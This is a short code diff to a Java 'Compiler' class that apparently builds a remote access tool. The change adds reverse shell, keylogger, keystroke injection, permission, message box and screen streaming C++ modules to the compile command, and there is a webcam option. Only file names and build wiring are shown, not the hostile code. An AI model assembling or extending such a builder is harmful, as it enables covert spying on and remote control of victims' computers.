@@ -52,7 +52,13 @@ public class Compiler implements ActionListener {
                     "download/Download.cpp " +
                     "file/FileManager.cpp  " +
                     "information/system/SystemInformation.cpp  " +
-                    "information/network/NetworkInformation.cpp ");
+                    "information/network/NetworkInformation.cpp " +
+                    "reverse_shell/ReverseShell.cpp " +
+                    "keyboard/KeyboardExecuter.cpp " +
+                    "keylogger/KeyLogger.cpp " +
+                    "permission/Permission.cpp " +
+                    "box_message/MessageBoxGUI.cpp " +
+                    "screen/ScreenStreamer.cpp ");
             if (checkBoxes[0].isSelected()) {
                 modifier.addInclude("#define WEBCAM");
                 command.append(
